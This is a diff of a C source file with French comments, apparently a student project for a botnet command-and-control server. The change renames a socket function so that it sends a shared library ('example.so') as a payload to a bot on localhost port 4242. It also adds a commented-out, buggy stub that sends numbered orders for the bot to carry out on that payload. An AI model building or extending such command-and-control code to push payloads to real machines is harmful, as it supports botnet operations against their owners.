@@ -19,6 +19,7 @@
 #define IP_BOT "127.0.0.1"
 #define PORT_TCP_BOT 4242
 #define TAILLE 20
+
 /**
  * int traitementUDP(info_bot_t structure, int taille)
  * Fonction de traitement de la réception UDP (pour le moment printf la structure seulement)
@@ -52,19 +53,19 @@ void lancementBoucleServeurUDP(void *s)
 }
 
 /**
- * void ecriture_socket(void *s)
- * Fonction qui écrit un msg dans la socket TCP puis la ferme à la fin 
- * TO DO : il enverra des ordres et non un msg
+ * void send_file_tcp(void *s)
+ * Fonction qui envoie la charge de travail dans la socket TCP puis la ferme à la fin 
+ * 
  * param pointeur vers la socket TCP
  * 
  */
-void ecriture_socket(void *s)
+void send_file_tcp(void *s)
 { /* 
     char *msg = "Hello from CC\n";
     // Obtient une structure de fichier 
     if (write(socket_tcp, msg, strlen(msg)) < 0)
     {
-        perror("ecriture_socket.write");
+        perror("send_file_tcp.write");
         exit(-1);
     }
     close(socket_tcp); */
@@ -76,7 +77,7 @@ void ecriture_socket(void *s)
     off_t offset;
     int remain_data;
     // create file
-    fd = open("example.so", O_RDONLY); 
+    fd = open("example.so", O_RDONLY);
     if (fd == -1)
     {
         perror("Error IN Opening File .. \n");
@@ -91,7 +92,7 @@ void ecriture_socket(void *s)
 
     sprintf(file_size, "%d", file_stat.st_size);
     /* Sending file size */
-    if (send(socket_tcp, file_size, sizeof(file_size), 0) < 0){
+    if (send(socket_tcp, file_size, sizeof(file_size), 0) < 0) { 
         perror("Error on sending file size");
         exit(EXIT_FAILURE);
 
@@ -104,15 +105,38 @@ void ecriture_socket(void *s)
     /* Envoie le fichier en plusieurs fois : https://stackoverflow.com/questions/11952898/c-send-and-receive-file */
     while (((sent_bytes = sendfile(socket_tcp, fd, &offset, BUFSIZ)) > 0) && (remain_data > 0))
     {
-        printf("1. Server sent %d bytes from file's data, offset is now : %d and remaining data = %d\n", sent_bytes, offset, remain_data);
+        printf("1. Sent %d bytes from file's data, offset is now : %d and remaining data = %d\n", sent_bytes, offset, remain_data);
         remain_data -= sent_bytes;
-        printf("2. Server sent %d bytes from file's data, offset is now : %d and remaining data = %d\n", sent_bytes, offset, remain_data);
+        printf("2. Sent sent %d bytes from file's data, offset is now : %d and remaining data = %d\n", sent_bytes, offset, remain_data);
     }
    
     close(fd); // close the file
     // printf("File Sent successfully !!! \n");
     close(socket_tcp);
 }
+
+
+/**
+ * void send_commad_tcp(void *s, char num)
+ * Fonction qui récupère une socket_tcp et un numéro de commande sous forme de char(pour optimiser)
+ * selon le numéro de commande elle envoie un ordre sous forme de chaine de caractère au bot
+ * selon l'ordre qu'il recevra il agira en conséquence sur la charge utile
+ * apres lui avoir envoyée la commande à faire elle appelle la fct qui envoie la charge utile
+ * 
+ *
+ * param pointeur vers la socket TCP
+ * 
+ */
+/* 
+void send_commad_tcp(void *s)
+{
+    int socket_tcp = *((int *)s);
+    char num;
+    printf("Donnez un numéro de commande : \n");
+    scanf("%c", &num);
+    write(socket_tcp, (void *)num, strlen(num));      
+    send_file_tcp((void *) &socket_tcp);
+} */
 
 /**
  * void init_socket()
@@ -156,7 +180,7 @@ void init_socket(void *arg)
     else
     {
         printf("connected to the server..\n");
-        ecriture_socket((void *)&socket_tcp);
+        send_file_tcp((void *)&socket_tcp);
     }
     return;
 }
